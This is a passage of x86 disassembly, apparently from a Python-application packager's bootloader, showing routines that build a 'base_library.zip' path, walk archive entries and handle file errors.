  403f33:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  403f39:	f7 d1                	not    %ecx
  403f3b:	21 c8                	and    %ecx,%eax
  403f3d:	25 80 80 80 80       	and    $0x80808080,%eax
  403f42:	74 ea                	je     0x403f2e
  403f44:	89 c1                	mov    %eax,%ecx
  403f46:	89 34 24             	mov    %esi,(%esp)
  403f49:	c1 e9 10             	shr    $0x10,%ecx
  403f4c:	a9 80 80 00 00       	test   $0x8080,%eax
  403f51:	0f 44 c1             	cmove  %ecx,%eax
  403f54:	8d 4a 02             	lea    0x2(%edx),%ecx
  403f57:	0f 44 d1             	cmove  %ecx,%edx
  403f5a:	00 c0                	add    %al,%al
  403f5c:	b8 3b 00 00 00       	mov    $0x3b,%eax
  403f61:	83 da 03             	sbb    $0x3,%edx
  403f64:	81 ea 00 82 41 00    	sub    $0x418200,%edx
  403f6a:	c6 82 00 82 41 00 5c 	movb   $0x5c,0x418200(%edx)
  403f71:	c7 82 01 82 41 00 62 	movl   $0x65736162,0x418201(%edx)
  403f78:	61 73 65 
  403f7b:	c7 82 05 82 41 00 5f 	movl   $0x62696c5f,0x418205(%edx)
  403f82:	6c 69 62 
  403f85:	c7 82 09 82 41 00 72 	movl   $0x79726172,0x418209(%edx)
  403f8c:	61 72 79 
  403f8f:	c7 82 0d 82 41 00 2e 	movl   $0x70697a2e,0x41820d(%edx)
  403f96:	7a 69 70 
  403f99:	66 89 82 11 82 41 00 	mov    %ax,0x418211(%edx)
  403fa0:	e8 93 68 00 00       	call   0x40a838
  403fa5:	89 74 24 04          	mov    %esi,0x4(%esp)
  403fa9:	89 44 24 08          	mov    %eax,0x8(%esp)
  403fad:	c7 04 24 00 82 41 00 	movl   $0x418200,(%esp)
  403fb4:	e8 bf 68 00 00       	call   0x40a878
  403fb9:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403fc0:	00 
  403fc1:	c7 44 24 04 00 82 41 	movl   $0x418200,0x4(%esp)
  403fc8:	00 
  403fc9:	c7 04 24 c0 61 41 00 	movl   $0x4161c0,(%esp)
  403fd0:	e8 eb 11 00 00       	call   0x4051c0
  403fd5:	85 c0                	test   %eax,%eax
  403fd7:	0f 84 34 01 00 00    	je     0x404111
  403fdd:	c7 04 24 c0 61 41 00 	movl   $0x4161c0,(%esp)
  403fe4:	ff 15 a0 10 41 00    	call   *0x4110a0
  403fea:	a1 74 d6 41 00       	mov    0x41d674,%eax
  403fef:	85 c0                	test   %eax,%eax
  403ff1:	0f 85 3c fe ff ff    	jne    0x403e33
  403ff7:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403ffe:	00 
  403fff:	89 74 24 04          	mov    %esi,0x4(%esp)
  404003:	c7 04 24 40 31 41 00 	movl   $0x413140,(%esp)
  40400a:	e8 b1 11 00 00       	call   0x4051c0
  40400f:	85 c0                	test   %eax,%eax
  404011:	0f 84 c0 00 00 00    	je     0x4040d7
  404017:	c7 04 24 40 31 41 00 	movl   $0x413140,(%esp)
  40401e:	ff 15 98 10 41 00    	call   *0x411098
  404024:	e9 36 fe ff ff       	jmp    0x403e5f
  404029:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404030:	e8 5b 13 00 00       	call   0x405390
  404035:	85 c0                	test   %eax,%eax
  404037:	89 c6                	mov    %eax,%esi
  404039:	0f 84 ae 00 00 00    	je     0x4040ed
  40403f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404046:	00 
  404047:	89 44 24 04          	mov    %eax,0x4(%esp)
  40404b:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  404051:	89 04 24             	mov    %eax,(%esp)
  404054:	ff 15 48 10 41 00    	call   *0x411048
  40405a:	89 34 24             	mov    %esi,(%esp)
  40405d:	e8 fe fc ff ff       	call   0x403d60
  404062:	e9 95 fe ff ff       	jmp    0x403efc
  404067:	89 f6                	mov    %esi,%esi
  404069:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404070:	c7 04 24 c0 61 41 00 	movl   $0x4161c0,(%esp)
  404077:	ff 15 3c 10 41 00    	call   *0x41103c
  40407d:	e9 28 fe ff ff       	jmp    0x403eaa
  404082:	c7 04 24 b0 d1 40 00 	movl   $0x40d1b0,(%esp)
  404089:	e8 82 dd ff ff       	call   0x401e10
  40408e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404093:	e9 72 fe ff ff       	jmp    0x403f0a
  404098:	c7 04 24 74 d0 40 00 	movl   $0x40d074,(%esp)
  40409f:	e8 6c dd ff ff       	call   0x401e10
  4040a4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4040a9:	e9 5c fe ff ff       	jmp    0x403f0a
  4040ae:	66 90                	xchg   %ax,%ax
  4040b0:	c7 04 24 2c d1 40 00 	movl   $0x40d12c,(%esp)
  4040b7:	e8 54 dd ff ff       	call   0x401e10
  4040bc:	e9 dd fd ff ff       	jmp    0x403e9e
  4040c1:	c7 04 24 6c d1 40 00 	movl   $0x40d16c,(%esp)
  4040c8:	e8 43 dd ff ff       	call   0x401e10
  4040cd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4040d2:	e9 33 fe ff ff       	jmp    0x403f0a
  4040d7:	c7 04 24 04 d1 40 00 	movl   $0x40d104,(%esp)
  4040de:	e8 2d dd ff ff       	call   0x401e10
  4040e3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4040e8:	e9 1d fe ff ff       	jmp    0x403f0a
  4040ed:	c7 04 24 8c d1 40 00 	movl   $0x40d18c,(%esp)
  4040f4:	e8 17 dd ff ff       	call   0x401e10
  4040f9:	eb d2                	jmp    0x4040cd
  4040fb:	c7 04 24 c4 d0 40 00 	movl   $0x40d0c4,(%esp)
  404102:	e8 09 dd ff ff       	call   0x401e10
  404107:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40410c:	e9 f9 fd ff ff       	jmp    0x403f0a
  404111:	c7 04 24 9c d0 40 00 	movl   $0x40d09c,(%esp)
  404118:	e8 f3 dc ff ff       	call   0x401e10
  40411d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404122:	e9 e3 fd ff ff       	jmp    0x403f0a
  404127:	89 f6                	mov    %esi,%esi
  404129:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404130:	55                   	push   %ebp
  404131:	57                   	push   %edi
  404132:	56                   	push   %esi
  404133:	53                   	push   %ebx
  404134:	83 ec 2c             	sub    $0x2c,%esp
  404137:	8b 0d 74 d6 41 00    	mov    0x41d674,%ecx
  40413d:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  404141:	85 c9                	test   %ecx,%ecx
  404143:	74 3d                	je     0x404182
  404145:	8d 83 68 30 00 00    	lea    0x3068(%ebx),%eax
  40414b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404152:	00 
  404153:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40415a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40415e:	e8 5d 14 00 00       	call   0x4055c0
  404163:	85 c0                	test   %eax,%eax
  404165:	89 c7                	mov    %eax,%edi
  404167:	0f 84 9e 01 00 00    	je     0x40430b
  40416d:	89 04 24             	mov    %eax,(%esp)
  404170:	ff 15 50 10 41 00    	call   *0x411050
  404176:	89 3c 24             	mov    %edi,(%esp)
  404179:	89 c6                	mov    %eax,%esi
  40417b:	e8 88 66 00 00       	call   0x40a808
  404180:	eb 2d                	jmp    0x4041af
  404182:	8d b3 68 30 00 00    	lea    0x3068(%ebx),%esi
  404188:	89 34 24             	mov    %esi,(%esp)
  40418b:	e8 a8 66 00 00       	call   0x40a838
  404190:	89 34 24             	mov    %esi,(%esp)
  404193:	c7 44 24 0c f8 d1 40 	movl   $0x40d1f8,0xc(%esp)
  40419a:	00 
  40419b:	c7 44 24 08 ff d1 40 	movl   $0x40d1ff,0x8(%esp)
  4041a2:	00 
  4041a3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4041a7:	ff 15 20 10 41 00    	call   *0x411020
  4041ad:	89 c6                	mov    %eax,%esi
  4041af:	85 f6                	test   %esi,%esi
  4041b1:	0f 84 67 01 00 00    	je     0x40431e
  4041b7:	89 74 24 04          	mov    %esi,0x4(%esp)
  4041bb:	c7 04 24 2d d2 40 00 	movl   $0x40d22d,(%esp)
  4041c2:	ff 15 40 10 41 00    	call   *0x411040
  4041c8:	c7 04 24 36 d2 40 00 	movl   $0x40d236,(%esp)
  4041cf:	ff 15 70 10 41 00    	call   *0x411070
  4041d5:	89 04 24             	mov    %eax,(%esp)
  4041d8:	ff 15 60 10 41 00    	call   *0x411060
  4041de:	c7 44 24 04 3e d2 40 	movl   $0x40d23e,0x4(%esp)
  4041e5:	00 
  4041e6:	89 04 24             	mov    %eax,(%esp)
  4041e9:	ff 15 94 10 41 00    	call   *0x411094
  4041ef:	8b 6b 08             	mov    0x8(%ebx),%ebp
  4041f2:	3b 6b 0c             	cmp    0xc(%ebx),%ebp
  4041f5:	89 44 24 18          	mov    %eax,0x18(%esp)
  4041f9:	a1 b8 e3 41 00       	mov    0x41e3b8,%eax
  4041fe:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404202:	72 23                	jb     0x404227
  404204:	e9 f8 00 00 00       	jmp    0x404301
  404209:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404210:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404214:	89 1c 24             	mov    %ebx,(%esp)
  404217:	e8 b4 d3 ff ff       	call   0x4015d0
  40421c:	39 43 0c             	cmp    %eax,0xc(%ebx)
  40421f:	89 c5                	mov    %eax,%ebp
  404221:	0f 86 da 00 00 00    	jbe    0x404301
  404227:	0f b6 45 11          	movzbl 0x11(%ebp),%eax
  40422b:	83 e0 df             	and    $0xffffffdf,%eax
  40422e:	3c 4d                	cmp    $0x4d,%al
  404230:	75 de                	jne    0x404210
  404232:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404236:	89 1c 24             	mov    %ebx,(%esp)
  404239:	e8 d2 d3 ff ff       	call   0x401610
  40423e:	8b 15 74 d6 41 00    	mov    0x41d674,%edx
  404244:	89 c6                	mov    %eax,%esi
  404246:	8b 45 0c             	mov    0xc(%ebp),%eax
  404249:	8b 3d 5c 10 41 00    	mov    0x41105c,%edi
  40424f:	85 d2                	test   %edx,%edx
  404251:	89 04 24             	mov    %eax,(%esp)
  404254:	74 6a                	je     0x4042c0
  404256:	ff 54 24 1c          	call   *0x1c(%esp)
  40425a:	83 ec 04             	sub    $0x4,%esp
  40425d:	83 e8 08             	sub    $0x8,%eax
  404260:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404264:	8d 46 08             	lea    0x8(%esi),%eax
  404267:	c7 44 24 04 44 d2 40 	movl   $0x40d244,0x4(%esp)
  40426e:	00 
  40426f:	89 44 24 08          	mov    %eax,0x8(%esp)
  404273:	8b 44 24 18          	mov    0x18(%esp),%eax
  404277:	89 04 24             	mov    %eax,(%esp)
  40427a:	ff d7                	call   *%edi
  40427c:	85 c0                	test   %eax,%eax
  40427e:	8d 7d 12             	lea    0x12(%ebp),%edi
  404281:	74 6c                	je     0x4042ef
  404283:	89 44 24 04          	mov    %eax,0x4(%esp)
  404287:	89 3c 24             	mov    %edi,(%esp)
  40428a:	ff 15 74 10 41 00    	call   *0x411074
  404290:	85 c0                	test   %eax,%eax
  404292:	74 5b                	je     0x4042ef
  404294:	ff 15 8c 10 41 00    	call   *0x41108c
  40429a:	85 c0                	test   %eax,%eax
  40429c:	74 0c                	je     0x4042aa
  40429e:	ff 15 88 10 41 00    	call   *0x411088
  4042a4:	ff 15 90 10 41 00    	call   *0x411090
  4042aa:	89 34 24             	mov    %esi,(%esp)
  4042ad:	e8 56 65 00 00       	call   0x40a808
  4042b2:	e9 59 ff ff ff       	jmp    0x404210
  4042b7:	89 f6                	mov    %esi,%esi
  4042b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4042c0:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  4042c6:	83 ec 04             	sub    $0x4,%esp
  4042c9:	83 e8 0c             	sub    $0xc,%eax
  4042cc:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4042d0:	8d 46 0c             	lea    0xc(%esi),%eax
  4042d3:	c7 44 24 04 47 d2 40 	movl   $0x40d247,0x4(%esp)
  4042da:	00 
  4042db:	89 44 24 08          	mov    %eax,0x8(%esp)
  4042df:	8b 44 24 18          	mov    0x18(%esp),%eax
  4042e3:	89 04 24             	mov    %eax,(%esp)
  4042e6:	ff d7                	call   *%edi
  4042e8:	85 c0                	test   %eax,%eax
  4042ea:	8d 7d 12             	lea    0x12(%ebp),%edi
  4042ed:	75 94                	jne    0x404283
  4042ef:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4042f3:	c7 04 24 4a d2 40 00 	movl   $0x40d24a,(%esp)
  4042fa:	e8 11 db ff ff       	call   0x401e10
  4042ff:	eb 93                	jmp    0x404294
  404301:	31 c0                	xor    %eax,%eax
  404303:	83 c4 2c             	add    $0x2c,%esp
  404306:	5b                   	pop    %ebx
  404307:	5e                   	pop    %esi
  404308:	5f                   	pop    %edi
  404309:	5d                   	pop    %ebp
  40430a:	c3                   	ret
  40430b:	c7 04 24 d4 d1 40 00 	movl   $0x40d1d4,(%esp)
  404312:	e8 f9 da ff ff       	call   0x401e10
  404317:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40431c:	eb e5                	jmp    0x404303
  40431e:	c7 04 24 08 d2 40 00 	movl   $0x40d208,(%esp)
  404325:	e8 e6 da ff ff       	call   0x401e10
  40432a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40432f:	eb d2                	jmp    0x404303
  404331:	eb 0d                	jmp    0x404340
  404333:	90                   	nop
  404334:	90                   	nop
  404335:	90                   	nop
  404336:	90                   	nop
  404337:	90                   	nop
  404338:	90                   	nop
  404339:	90                   	nop
  40433a:	90                   	nop
  40433b:	90                   	nop
  40433c:	90                   	nop
  40433d:	90                   	nop
  40433e:	90                   	nop
  40433f:	90                   	nop
  404340:	57                   	push   %edi
  404341:	56                   	push   %esi
  404342:	53                   	push   %ebx
  404343:	83 ec 10             	sub    $0x10,%esp
  404346:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40434a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40434e:	8b 7b 04             	mov    0x4(%ebx),%edi
  404351:	8b 40 04             	mov    0x4(%eax),%eax
  404354:	83 c3 68             	add    $0x68,%ebx
  404357:	89 04 24             	mov    %eax,(%esp)
  40435a:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  404360:	01 c7                	add    %eax,%edi
  404362:	a1 74 d6 41 00       	mov    0x41d674,%eax
  404367:	83 ec 04             	sub    $0x4,%esp
  40436a:	85 c0                	test   %eax,%eax
  40436c:	74 47                	je     0x4043b5
  40436e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404375:	00 
  404376:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40437a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404381:	e8 3a 12 00 00       	call   0x4055c0
  404386:	85 c0                	test   %eax,%eax
  404388:	89 c6                	mov    %eax,%esi
  40438a:	0f 84 b5 00 00 00    	je     0x404445
  404390:	89 7c 24 08          	mov    %edi,0x8(%esp)
  404394:	89 44 24 04          	mov    %eax,0x4(%esp)
  404398:	c7 04 24 83 d2 40 00 	movl   $0x40d283,(%esp)
  40439f:	ff 15 2c 10 41 00    	call   *0x41102c
  4043a5:	39 f3                	cmp    %esi,%ebx
  4043a7:	89 c7                	mov    %eax,%edi
  4043a9:	74 51                	je     0x4043fc
  4043ab:	89 34 24             	mov    %esi,(%esp)
  4043ae:	e8 55 64 00 00       	call   0x40a808
  4043b3:	eb 47                	jmp    0x4043fc
  4043b5:	89 1c 24             	mov    %ebx,(%esp)
  4043b8:	e8 7b 64 00 00       	call   0x40a838
  4043bd:	89 1c 24             	mov    %ebx,(%esp)
  4043c0:	c7 44 24 0c f8 d1 40 	movl   $0x40d1f8,0xc(%esp)
  4043c7:	00 
  4043c8:	c7 44 24 08 ff d1 40 	movl   $0x40d1ff,0x8(%esp)
  4043cf:	00 
  4043d0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4043d4:	ff 15 20 10 41 00    	call   *0x411020
  4043da:	89 c3                	mov    %eax,%ebx
  4043dc:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4043e0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4043e4:	c7 04 24 89 d2 40 00 	movl   $0x40d289,(%esp)
  4043eb:	ff 15 28 10 41 00    	call   *0x411028
  4043f1:	89 1c 24             	mov    %ebx,(%esp)
  4043f4:	89 c7                	mov    %eax,%edi
  4043f6:	ff 15 b8 10 41 00    	call   *0x4110b8
  4043fc:	c7 04 24 8f d2 40 00 	movl   $0x40d28f,(%esp)
  404403:	ff 15 44 10 41 00    	call   *0x411044
  404409:	85 c0                	test   %eax,%eax
  40440b:	74 4f                	je     0x40445c
  40440d:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404411:	89 04 24             	mov    %eax,(%esp)
  404414:	ff 15 6c 10 41 00    	call   *0x41106c
  40441a:	89 c3                	mov    %eax,%ebx
  40441c:	31 c0                	xor    %eax,%eax
  40441e:	85 db                	test   %ebx,%ebx
  404420:	75 0e                	jne    0x404430
  404422:	83 c4 10             	add    $0x10,%esp
  404425:	5b                   	pop    %ebx
  404426:	5e                   	pop    %esi
  404427:	5f                   	pop    %edi
  404428:	c3                   	ret
  404429:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404430:	c7 04 24 bc d2 40 00 	movl   $0x40d2bc,(%esp)
  404437:	e8 d4 d9 ff ff       	call   0x401e10
  40443c:	83 c4 10             	add    $0x10,%esp
  40443f:	89 d8                	mov    %ebx,%eax
  404441:	5b                   	pop    %ebx
  404442:	5e                   	pop    %esi
  404443:	5f                   	pop    %edi
  404444:	c3                   	ret
  404445:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404449:	c7 04 24 5c d2 40 00 	movl   $0x40d25c,(%esp)
  404450:	e8 bb d9 ff ff       	call   0x401e10
  404455:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40445a:	eb c6                	jmp    0x404422
  40445c:	c7 04 24 94 d2 40 00 	movl   $0x40d294,(%esp)
  404463:	e8 a8 d9 ff ff       	call   0x401e10
  404468:	89 3c 24             	mov    %edi,(%esp)
  40446b:	ff 15 b8 10 41 00    	call   *0x4110b8
  404471:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404476:	eb aa                	jmp    0x404422
  404478:	90                   	nop
  404479:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404480:	56                   	push   %esi
  404481:	53                   	push   %ebx
  404482:	83 ec 14             	sub    $0x14,%esp
  404485:	8b 74 24 20          	mov    0x20(%esp),%esi
  404489:	8b 5e 08             	mov    0x8(%esi),%ebx
  40448c:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  40448f:	72 15                	jb     0x4044a6
  404491:	eb 2d                	jmp    0x4044c0
  404493:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404497:	89 34 24             	mov    %esi,(%esp)
  40449a:	e8 31 d1 ff ff       	call   0x4015d0
  40449f:	39 46 0c             	cmp    %eax,0xc(%esi)
  4044a2:	89 c3                	mov    %eax,%ebx
  4044a4:	76 1a                	jbe    0x4044c0
  4044a6:	80 7b 11 7a          	cmpb   $0x7a,0x11(%ebx)
  4044aa:	75 e7                	jne    0x404493
  4044ac:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4044b0:	89 34 24             	mov    %esi,(%esp)
  4044b3:	e8 88 fe ff ff       	call   0x404340
  4044b8:	eb d9                	jmp    0x404493
  4044ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4044c0:	83 c4 14             	add    $0x14,%esp
  4044c3:	31 c0                	xor    %eax,%eax
  4044c5:	5b                   	pop    %ebx
  4044c6:	5e                   	pop    %esi
  4044c7:	c3                   	ret
  4044c8:	90                   	nop
  4044c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4044d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4044d4:	83 b8 6c 40 00 00 01 	cmpl   $0x1,0x406c(%eax)
  4044db:	74 03                	je     0x4044e0
  4044dd:	f3 c3                	repz ret
  4044df:	90                   	nop
  4044e0:	a1 b0 10 41 00       	mov    0x4110b0,%eax
  4044e5:	ff e0                	jmp    *%eax
  4044e7:	90                   	nop
  4044e8:	90                   	nop
  4044e9:	90                   	nop
  4044ea:	90                   	nop
  4044eb:	90                   	nop
  4044ec:	90                   	nop
  4044ed:	90                   	nop
  4044ee:	90                   	nop
  4044ef:	90                   	nop
  4044f0:	53                   	push   %ebx
  4044f1:	89 c3                	mov    %eax,%ebx
  4044f3:	83 ec 18             	sub    $0x18,%esp
  4044f6:	c7 04 24 64 00 00 00 	movl   $0x64,(%esp)
  4044fd:	ff 15 7c e2 41 00    	call   *0x41e27c
  404503:	83 ec 04             	sub    $0x4,%esp
  404506:	89 1c 24             	mov    %ebx,(%esp)
  404509:	e8 c2 63 00 00       	call   0x40a8d0
  40450e:	83 c4 18             	add    $0x18,%esp
  404511:	5b                   	pop    %ebx
  404512:	c3                   	ret
  404513:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404519:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404520:	53                   	push   %ebx
  404521:	b8 18 40 00 00       	mov    $0x4018,%eax
  404526:	e8 25 60 00 00       	call   0x40a550
  40452b:	29 c4                	sub    %eax,%esp
  40452d:	8b 84 24 20 40 00 00 	mov    0x4020(%esp),%eax
  404534:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  404538:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40453f:	00 
  404540:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404547:	89 44 24 04          	mov    %eax,0x4(%esp)
  40454b:	e8 70 0c 00 00       	call   0x4051c0
  404550:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  404557:	00 
  404558:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40455c:	89 04 24             	mov    %eax,(%esp)
  40455f:	ff 15 2c e2 41 00    	call   *0x41e22c
  404565:	83 ec 0c             	sub    $0xc,%esp
  404568:	85 c0                	test   %eax,%eax
  40456a:	75 14                	jne    0x404580
  40456c:	81 c4 18 40 00 00    	add    $0x4018,%esp
  404572:	31 c0                	xor    %eax,%eax
  404574:	5b                   	pop    %ebx
  404575:	c3                   	ret
  404576:	8d 76 00             	lea    0x0(%esi),%esi
  404579:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404580:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  404587:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  40458e:	00 
  40458f:	89 1c 24             	mov    %ebx,(%esp)
  404592:	89 44 24 04          	mov    %eax,0x4(%esp)
  404596:	ff 15 14 e2 41 00    	call   *0x41e214
  40459c:	83 ec 0c             	sub    $0xc,%esp
  40459f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4045a6:	00 
  4045a7:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4045ab:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4045b2:	e8 69 0a 00 00       	call   0x405020
  4045b7:	85 c0                	test   %eax,%eax
  4045b9:	74 b1                	je     0x40456c
  4045bb:	80 38 00             	cmpb   $0x0,(%eax)
  4045be:	74 ac                	je     0x40456c
  4045c0:	89 04 24             	mov    %eax,(%esp)
  4045c3:	e8 00 63 00 00       	call   0x40a8c8
  4045c8:	81 c4 18 40 00 00    	add    $0x4018,%esp
  4045ce:	5b                   	pop    %ebx
  4045cf:	c3                   	ret
  4045d0:	57                   	push   %edi
  4045d1:	56                   	push   %esi
  4045d2:	53                   	push   %ebx
  4045d3:	83 ec 10             	sub    $0x10,%esp
  4045d6:	8b 44 24 20          	mov    0x20(%esp),%eax
  4045da:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4045e1:	00 
  4045e2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4045e9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4045ed:	e8 ce 0b 00 00       	call   0x4051c0
  4045f2:	89 c6                	mov    %eax,%esi
  4045f4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4045f8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4045ff:	00 
  404600:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404607:	89 44 24 04          	mov    %eax,0x4(%esp)
  40460b:	e8 b0 0b 00 00       	call   0x4051c0
  404610:	89 34 24             	mov    %esi,(%esp)
  404613:	89 c3                	mov    %eax,%ebx
  404615:	89 44 24 04          	mov    %eax,0x4(%esp)
  404619:	ff 15 74 e2 41 00    	call   *0x41e274
  40461f:	83 ec 08             	sub    $0x8,%esp
  404622:	89 c7                	mov    %eax,%edi
  404624:	89 34 24             	mov    %esi,(%esp)
  404627:	e8 dc 61 00 00       	call   0x40a808
  40462c:	89 1c 24             	mov    %ebx,(%esp)
  40462f:	e8 d4 61 00 00       	call   0x40a808
  404634:	83 c4 10             	add    $0x10,%esp
  404637:	89 f8                	mov    %edi,%eax
  404639:	5b                   	pop    %ebx
  40463a:	5e                   	pop    %esi
  40463b:	5f                   	pop    %edi
  40463c:	c3                   	ret
  40463d:	8d 76 00             	lea    0x0(%esi),%esi
  404640:	56                   	push   %esi
  404641:	53                   	push   %ebx
  404642:	83 ec 14             	sub    $0x14,%esp
  404645:	8b 44 24 20          	mov    0x20(%esp),%eax
  404649:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404650:	00 
  404651:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404658:	89 44 24 04          	mov    %eax,0x4(%esp)
  40465c:	e8 5f 0b 00 00       	call   0x4051c0
  404661:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404668:	00 
  404669:	89 c3                	mov    %eax,%ebx
  40466b:	89 04 24             	mov    %eax,(%esp)
  40466e:	ff 15 74 e2 41 00    	call   *0x41e274
  404674:	83 ec 08             	sub    $0x8,%esp
  404677:	89 c6                	mov    %eax,%esi
  404679:	89 1c 24             	mov    %ebx,(%esp)
  40467c:	e8 87 61 00 00       	call   0x40a808
  404681:	83 c4 14             	add    $0x14,%esp
  404684:	89 f0                	mov    %esi,%eax
  404686:	5b                   	pop    %ebx
  404687:	5e                   	pop    %esi
  404688:	c3                   	ret
  404689:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404690:	55                   	push   %ebp
  404691:	57                   	push   %edi
  404692:	b8 2c 20 00 00       	mov    $0x202c,%eax
  404697:	56                   	push   %esi
  404698:	53                   	push   %ebx
  404699:	e8 b2 5e 00 00       	call   0x40a550
  40469e:	29 c4                	sub    %eax,%esp
  4046a0:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  4046a4:	8b b4 24 40 20 00 00 	mov    0x2040(%esp),%esi
  4046ab:	c7 04 24 00 10 00 00 	movl   $0x1000,(%esp)
  4046b2:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4046b6:	ff 15 50 e2 41 00    	call   *0x41e250
  4046bc:	83 ec 08             	sub    $0x8,%esp
  4046bf:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4046c3:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4046c7:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  4046ce:	00 
  4046cf:	89 34 24             	mov    %esi,(%esp)
  4046d2:	bb 05 00 00 00       	mov    $0x5,%ebx
  4046d7:	e8 44 09 00 00       	call   0x405020
  4046dc:	e8 f7 61 00 00       	call   0x40a8d8
  4046e1:	c7 44 24 04 dc d2 40 	movl   $0x40d2dc,0x4(%esp)
  4046e8:	00 
  4046e9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4046ed:	89 3c 24             	mov    %edi,(%esp)
  4046f0:	e8 c3 61 00 00       	call   0x40a8b8
  4046f5:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4046f9:	89 34 24             	mov    %esi,(%esp)
  4046fc:	ff 15 0c e3 41 00    	call   *0x41e30c
  404702:	89 04 24             	mov    %eax,(%esp)
  404705:	89 c5                	mov    %eax,%ebp
  404707:	e8 d4 61 00 00       	call   0x40a8e0
  40470c:	85 c0                	test   %eax,%eax
  40470e:	74 20                	je     0x404730
  404710:	89 2c 24             	mov    %ebp,(%esp)
  404713:	e8 f0 60 00 00       	call   0x40a808
  404718:	83 eb 01             	sub    $0x1,%ebx
  40471b:	75 d8                	jne    0x4046f5
  40471d:	81 c4 2c 20 00 00    	add    $0x202c,%esp
  404723:	31 c0                	xor    %eax,%eax
  404725:	5b                   	pop    %ebx
  404726:	5e                   	pop    %esi
  404727:	5f                   	pop    %edi
  404728:	5d                   	pop    %ebp
  404729:	c3                   	ret
  40472a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404730:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404734:	89 34 24             	mov    %esi,(%esp)
  404737:	e8 ec 60 00 00       	call   0x40a828
  40473c:	89 2c 24             	mov    %ebp,(%esp)
  40473f:	e8 c4 60 00 00       	call   0x40a808
  404744:	81 c4 2c 20 00 00    	add    $0x202c,%esp
  40474a:	b8 01 00 00 00       	mov    $0x1,%eax
